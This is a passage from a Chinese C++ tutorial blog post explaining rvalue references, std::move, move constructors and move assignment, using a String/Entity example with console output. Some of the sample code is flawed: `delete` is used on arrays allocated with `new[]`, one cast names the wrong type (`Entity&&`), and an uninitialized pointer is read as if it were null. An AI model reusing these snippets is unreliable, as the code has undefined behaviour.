class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">move(int&amp;):</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        mov     QWORD PTR [rbp-8], rdi</span><br><span class="line">        mov     rax, QWORD PTR [rbp-8] ; 返回 x 的地址</span><br><span class="line">        pop     rbp</span><br><span class="line">        ret</span><br><span class="line">main:</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        sub     rsp, 16</span><br><span class="line">        mov     DWORD PTR [rbp-12], 4</span><br><span class="line">        lea     rax, [rbp-12]</span><br><span class="line">        mov     rdi, rax ; 传入 x 的地址</span><br><span class="line">        call    move(int&amp;)</span><br><span class="line">        mov     QWORD PTR [rbp-8], rax ; x 的地址赋值给了ref</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        leave</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure><p>移动语义到底有什么用呢，我们说右值引用都是<strong>想要</strong>来引用右值的，在这里用右值引用去引用左值，其实就是将这个左值<strong>标记</strong>为一个右值，所谓标记，就是从<code>ref</code>来看<code>x</code>是一个右值，实际上<code>x</code>仍然是一个左值，这是为了告诉程序员将这个左值看作一个右值来对待，今后这块内存区域不会再用到了。</p><p>想想平常对右值的定义，是不是一个临时的对象，一个用完就丢的一次性用品，但是将这个一次性用品直接就丢了会不会太可惜了，这是对资源的浪费，所以<strong>我们要将这个一次性用品掏空并利用好其中的资源然后再把它丢弃</strong>，这就是<code>移动语义</code>的真正<strong>内涵</strong>。</p><p>用一个整形的变量解释还是太难了，下面还是用一个类去解释会更清晰</p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">String</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">String</span>() = <span class="keyword">default</span>;</span><br><span class="line">    </span><br><span class="line"><span class="built_in">String</span>(<span class="type">const</span> <span class="type">char</span>* string) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;String Created\n&quot;</span>);</span><br><span class="line">m_Size = <span class="built_in">strlen</span>(string);</span><br><span class="line">m_Data = <span class="keyword">new</span> <span class="type">char</span>[m_Size];</span><br><span class="line"><span class="built_in">memcpy</span>(m_Data, string, m_Size);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="built_in">String</span>(<span class="type">const</span> String&amp; other) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;String Copied\n&quot;</span>);</span><br><span class="line">m_Size = other.m_Size;</span><br><span class="line">m_Data = <span class="keyword">new</span> <span class="type">char</span>[m_Size];</span><br><span class="line"><span class="built_in">memcpy</span>(m_Data, other.m_Data, m_Size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">~<span class="built_in">String</span>() &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;String Destroyed\n&quot;</span>);</span><br><span class="line"><span class="keyword">delete</span> m_Data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">char</span>* m_Data;</span><br><span class="line"><span class="type">uint32_t</span> m_Size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Entity</span>() = <span class="keyword">default</span>;</span><br><span class="line"><span class="built_in">Entity</span>(<span class="type">const</span> String&amp; name) : <span class="built_in">m_Name</span>(name) &#123;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">String m_Name;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里我定义了一个<code>String</code>类和一个<code>Entity</code>类，一个Entity有一个名字很正常吧。</p><p><code>String</code>类里我只定义了一个有参构造和一个拷贝构造，功能还没完善，我会细细说明</p><p>然后写了测试函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">Entity <span class="title">e</span><span class="params">(<span class="string">&quot;Hello World&quot;</span>)</span></span>;</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单，用字符串为名字定义了一个<code>Entity</code>对象</p><p>控制台输出如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String Created</span><br><span class="line">String Copied</span><br><span class="line">String Destroyed</span><br></pre></td></tr></table></figure><p>有点乱，先说明一下，本来<code>Entity</code>类中没有关于字符串字面量的构造函数，但是它有关于<code>String</code>类的构造函数<code>Entity(const String&amp; name)</code>，于是编译器做了一步隐式转换<code>(String)&quot;Hello World&quot;</code>，这样的出来的<code>String</code>对象是临时对象，姑且称之为<code>tmp</code>，它是一个右值，用<code>const String&amp;</code>引用一个右值，前面说了，也没问题，但是要注意，这个<code>tmp</code>被引用了之后就变成了左值。然后写一下这其中的调用链</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;Hello World&quot;</span> -&gt; (String)<span class="string">&quot;Hello World&quot;</span> -&gt; tmp.<span class="built_in">String</span>(<span class="string">&quot;Hello World&quot;</span>) -&gt; tmp -&gt;</span><br><span class="line">e.<span class="built_in">Entity</span>(tmp) -&gt; m_Name.<span class="built_in">String</span>(tmp) -&gt; e -&gt; tmp.~<span class="built_in">String</span>()</span><br></pre></td></tr></table></figure><p>控制台输出的内容分别在<code>tmp.String(&quot;Hello World&quot;)</code>、<code>m_Name.String(tmp)</code>和<code>tmp.~String()</code>中输出</p><p>乍一看，这好像没什么问题。如果真没问题那么这篇文章我也白写了。</p><p>我写这段代码的目的是什么，是不是用<code>&quot;Hello World&quot;</code>创建一个<code>String</code>类（重点是在堆区分配这个字符串数组），然后再用这个<code>String</code>对象初始化<code>e.m_Name</code>，就需要<code>e.m_Name</code>去拷贝这个临时对象，这个过程又涉及到了一次堆区的内存分配，仔细想想，我在堆区分配了两次内存，而第一次分配的内存又要马上释放掉，这真的合理吗，很明显这是资源的浪费。</p><p>第一次创建的临时对象就好比前面提到的一次性用品，仅仅只是为了拷贝就把它丢了未免太可惜了。为什么我们不直接把它在堆区创建的内存拿来用呢</p><p>接下来，让我们写<strong>移动构造函数</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>(String&amp;&amp; other) &#123; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;String Moved\n&quot;</span>);</span><br><span class="line">m_Size = other.m_Size;</span><br><span class="line">m_Data = other.m_Data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与拷贝构造函数的定义很像，不过对<code>other</code>对象的操作方式有些不一样。</p><p>不同的是，它并没像拷贝构造函数那样在堆区分配一片空间，取而代之的是直接将<code>this-&gt;m_Data</code>指向了由<code>other</code>申请分配的那片堆区的内存空间。只是这样还没完，因为<code>other</code>已经被视为一个右值，或者本身就是个右值，它一会可能是要被销毁的，那么它指向的堆区也会被跟着释放，这样的话新构造出来的对象不就指向了一片无效区吗，这不行，还得再改改</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>(String&amp;&amp; other) &#123; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;String Moved\n&quot;</span>);</span><br><span class="line">m_Size = other.m_Size;</span><br><span class="line">m_Data = other.m_Data;</span><br><span class="line">    </span><br><span class="line">    other.m_Size = <span class="number">0</span>;</span><br><span class="line">    other.m_Data = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单，将<code>other</code>的成员变量改一下就好了，其中<code>other.m_Size</code>的重置无所谓，反正后面也不会用到，重点是将<code>other.m_Data</code>置为<code>nullptr</code>，因为<code>String</code>类的析构函数<code>~String()</code>会涉及到<code>delete m_Data</code>，而<code>delete nullptr</code>这个操作既能避免原先分配的那片空间被释放，又不会引发错误，可谓一举两得。</p><blockquote><p>这是因为 <code>delete</code> 操作符实际上并不执行任何动作来检查或释放空指针。它仅用于释放已分配的内存。当你传递一个空指针给 <code>delete</code> 时，它会简单地忽略这个操作，并且不会引发运行时错误或异常。</p></blockquote><p>到这里，可以说新构造出来的对象不仅将<code>other</code>的数据全部窃取了过来，还把<code>other</code>扒得连裤衩子都不剩。这就是<strong>移动</strong>得核心思想。</p><p>将这个移动构造函数放在<code>String</code>类中，然后在<code>Entity</code>类中添加合适的构造函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Entity</span>(String&amp;&amp; name) : <span class="built_in">m_Name</span>(name) &#123;&#125;</span><br></pre></td></tr></table></figure><p>还是同样的测试代码，让我们看看结果怎么样</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String Created</span><br><span class="line">String Copied</span><br><span class="line">String Destroyed</span><br></pre></td></tr></table></figure><p>纳尼？怎么还是用拷贝构造函数，别急仔细分析一下</p><p><code>(String)&quot;Hello World&quot;</code>构造出一个<code>String</code>类的临时对象<code>tmp</code>，它是个右值不假，也成功调用了<code>e.Entity(String&amp;&amp; name)</code>没错，但是重点在后面的列表初始化<code>m_Name(name)</code></p><p>在这个<code>tmp</code>没有被<code>name</code>引用前是个右值没错，但是被<code>name</code>引用了之后它就变成了左值呀，因为可以用<code>name</code>标识符在让程序员在C++中表示<code>tmp</code>的内存空间了呀。所以编译器在构造<code>e.m_Name</code>时选择利用传入参数是左值和右值都可以的拷贝构造函数（反正不可能选择传入参数是右值的移动构造函数），怎么办呢</p><p>强制类型转换呀，虽然引用类型<code>name</code>本质是一个指针，但是它在后续的使用中都会自动解引用，解引用它指向的的那个对象，那片空间，是个左值。把它强制类型转换为右值引用就行了嘛。于是把<code>Entity</code>的构造函数修改一下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Entity</span>(String&amp;&amp; name) : <span class="built_in">m_Name</span>((Entity&amp;&amp;)name) &#123;&#125;</span><br></pre></td></tr></table></figure><p>或者选择更优雅的方式，用<code>std::move()</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Entity</span>(String&amp;&amp; name) : <span class="built_in">m_Name</span>(std::<span class="built_in">move</span>(name)) &#123;&#125;</span><br></pre></td></tr></table></figure><p><code>String</code>类和<code>Entity</code>类就变成了如下这样，为了便于之后的演示，我还在两个类中各自添加<code>Print()</code>函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">String</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">String</span>() = <span class="keyword">default</span>;</span><br><span class="line"><span class="built_in">String</span>(<span class="type">const</span> <span class="type">char</span>* string) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;String Created\n&quot;</span>);</span><br><span class="line">m_Size = <span class="built_in">strlen</span>(string);</span><br><span class="line">m_Data = <span class="keyword">new</span> <span class="type">char</span>[m_Size];</span><br><span class="line"><span class="built_in">memcpy</span>(m_Data, string, m_Size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">String</span>(<span class="type">const</span> String&amp; other) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;String Copied\n&quot;</span>);</span><br><span class="line">m_Size = other.m_Size;</span><br><span class="line">m_Data = <span class="keyword">new</span> <span class="type">char</span>[m_Size];</span><br><span class="line"><span class="built_in">memcpy</span>(m_Data, other.m_Data, m_Size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">String</span>(String&amp;&amp; other) &#123; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;String Moved\n&quot;</span>);</span><br><span class="line">m_Size = other.m_Size;</span><br><span class="line">m_Data = other.m_Data;</span><br><span class="line"></span><br><span class="line">other.m_Size = <span class="number">0</span>;</span><br><span class="line">other.m_Data = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">String</span>() &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;String Destroyed\n&quot;</span>);</span><br><span class="line"><span class="keyword">delete</span> m_Data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (m_Data == <span class="literal">nullptr</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NULL\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; m_Size; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, m_Data[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">char</span>* m_Data;</span><br><span class="line"><span class="type">uint32_t</span> m_Size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Entity</span>() = <span class="keyword">default</span>;</span><br><span class="line"><span class="built_in">Entity</span>(<span class="type">const</span> String&amp; name) : <span class="built_in">m_Name</span>(name) &#123;&#125;</span><br><span class="line"><span class="built_in">Entity</span>(String&amp;&amp; name) : <span class="built_in">m_Name</span>(std::<span class="built_in">move</span>(name)) &#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">m_Name.<span class="built_in">Print</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">String m_Name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">Entity <span class="title">e</span><span class="params">(<span class="string">&quot;Hello World&quot;</span>)</span></span>;</span><br><span class="line">    e.<span class="built_in">PrintName</span>();</span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来看看结果怎么样</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String Created</span><br><span class="line">String Moved</span><br><span class="line">String Destroyed</span><br><span class="line">Hello World</span><br></pre></td></tr></table></figure><p>完美！这样就只在堆区分配了一次内存空间，而且<code>tmp</code>被销毁了也不会对<code>e</code>产生任何影响</p><p>到这里其实已经讲的已经差不多了，但是还有一个<strong>移动赋值函数</strong>没讲，这并没有什么什么稀奇的，就像<strong>移动构造函数</strong>是对<strong>拷贝构造函数</strong>的重载一样，<strong>移动赋值函数</strong>同样也是对<strong>拷贝赋值函数</strong>也就是<code>ClassType&amp; operator=(const ClassType&amp; other)</code>的重载</p><p>为了方便直接拿<code>String</code>类做演示吧</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">String</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">String</span>() = <span class="keyword">default</span>;</span><br><span class="line"><span class="built_in">String</span>(<span class="type">const</span> <span class="type">char</span>* string) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;String Created\n&quot;</span>);</span><br><span class="line">m_Size = <span class="built_in">strlen</span>(string);</span><br><span class="line">m_Data = <span class="keyword">new</span> <span class="type">char</span>[m_Size];</span><br><span class="line"><span class="built_in">memcpy</span>(m_Data, string, m_Size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">String</span>(<span class="type">const</span> String&amp; other) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;String Copied\n&quot;</span>);</span><br><span class="line">m_Size = other.m_Size;</span><br><span class="line">m_Data = <span class="keyword">new</span> <span class="type">char</span>[m_Size];</span><br><span class="line"><span class="built_in">memcpy</span>(m_Data, other.m_Data, m_Size);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">String</span>(String&amp;&amp; other) &#123; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;String Moved\n&quot;</span>);</span><br><span class="line">m_Size = other.m_Size;</span><br><span class="line">m_Data = other.m_Data;</span><br><span class="line"></span><br><span class="line">other.m_Size = <span class="number">0</span>;</span><br><span class="line">other.m_Data = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">String</span>() &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;String Destroyed\n&quot;</span>);</span><br><span class="line"><span class="keyword">delete</span> m_Data;</span><br><span class="line">&#125;</span><br><span class="line">String&amp; <span class="keyword">operator</span>=(String&amp;&amp; other) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;String Moved\n&quot;</span>);</span><br><span class="line"><span class="keyword">delete</span>[] m_Data;</span><br><span class="line"></span><br><span class="line">m_Size = other.m_Size;</span><br><span class="line">m_Data = other.m_Data;</span><br><span class="line"></span><br><span class="line">other.m_Size = <span class="number">0</span>;</span><br><span class="line">other.m_Data = <span class="literal">nullptr</span>;</span><br><span class="line">        </span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (m_Data == <span class="literal">nullptr</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NULL\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; m_Size; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, m_Data[i]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">char</span>* m_Data;</span><br><span class="line"><span class="type">uint32_t</span> m_Size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">String apple = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line">String fruit;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;apple: &quot;</span>;</span><br><span class="line">apple.<span class="built_in">Print</span>();</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;fruit: &quot;</span>;</span><br><span class="line">fruit.<span class="built_in">Print</span>();</span><br><span class="line"></span><br><span class="line">fruit = std::<span class="built_in">move</span>(apple);</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;apple: &quot;</span>;</span><br><span class="line">apple.<span class="built_in">Print</span>();</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;fruit: &quot;</span>;</span><br><span class="line">fruit.<span class="built_in">Print</span>();</span><br><span class="line"></span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我已经构造出了一个左值对象<code>apple</code>，它有在堆区分配一片空间。同时我有一个没有分配好堆区空间的左值对象<code>fruit</code>。这时我想要<code>fruit</code>也有片空间但是不想去申请分配空间怎么办？去窃取<code>apple</code>的喽。用<code>std::move()</code>返回<code>apple</code>强制类型转换后的右值引用（<code>(String&amp;&amp;)apple</code>），将左值<code>apple</code>标记为右值（其实还是个左值），然后 <code>=</code> 符号就会自动调用 <code>String&amp; operator=(String&amp;&amp; other)</code>，将<code>apple</code>的数据完全移动到<code>fruit</code>，之后<code>apple</code>里面就什么都没有了。</p><p>看一下结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String Created</span><br><span class="line">apple: apple</span><br><span class="line">fruit: NULL</span><br><span class="line">String Moved</span><br><span class="line">apple: NULL</span><br><span class="line">fruit: apple</span><br></pre></td></tr></table></figure><p>很完美，<code>fruit</code>成功指向了<code>&quot;apple&quot;</code></p><p>但是，这个移动赋值函数还有点小瑕疵，如果我们做出了<code>apple = apple;</code>这样的行为，就会造成<code>apple</code>的自杀，这样就不符合原本的意思了，所以还需要做一个条件判断，改成下面这样</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String&amp; <span class="keyword">operator</span>=(String&amp;&amp; other) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;String Moved\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span> != &amp;other) &#123;</span><br><span class="line"><span class="keyword">delete</span>[] m_Data;</span><br><span class="line"></span><br><span class="line">m_Size = other.m_Size;</span><br><span class="line">m_Data = other.m_Data;</span><br><span class="line"></span><br><span class="line">other.m_Size = <span class="number">0</span>;</span><br><span class="line">other.m_Data = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就可以啦！</p><ol><li><p>左值不能<strong>隐式类型转化</strong>为右值引用，所以</p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span>&amp;&amp; ref = x; <span class="comment">// 不成立</span></span><br><span class="line"><span class="type">int</span>&amp;&amp; ref = (<span class="type">int</span>&amp;&amp;)x <span class="comment">// 成立</span></span><br></pre></td></tr></table></figure><p> 但是左值是可以<strong>隐式类型转化</strong>为左值引用的</p></li><li><p>右值引用本身是左值的情况下，其被使用时自动解引用为其引用的对象<br> 右值引用本身是右值的情况下，其被使用于右值定义时就像指针赋值一样，其它情况下会自动解引用为其引用的对象</p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span>&amp;&amp; <span class="title">move</span><span class="params">(<span class="type">int</span>&amp; x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">int</span>&amp;&amp;)x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">3</span>;</span><br><span class="line">    <span class="type">int</span>&amp;&amp; ref = <span class="built_in">move</span>(x); <span class="comment">// move(x)是右值，类型是右值引用</span></span><br><span class="line">                         <span class="comment">// ref的内存中会直接存储x的地址，这是直接定义时赋值的情况下</span></span><br><span class="line">    <span class="type">int</span>&amp;&amp; ref1 = <span class="built_in">move</span>(x) + <span class="number">1</span>; <span class="comment">// move(x)是右值，类型是右值引用</span></span><br><span class="line">                              <span class="comment">// 但是会接引用为x，因为要用到&#x27;+&#x27;上</span></span><br><span class="line">                              <span class="comment">// 最后ref1会引用到4上</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线程池</title>
      <link href="/2024/08/27/%E7%BA%BF%E7%A8%8B%E6%B1%A0/"/>
      <url>/2024/08/27/%E7%BA%BF%E7%A8%8B%E6%B1%A0/</url>
      
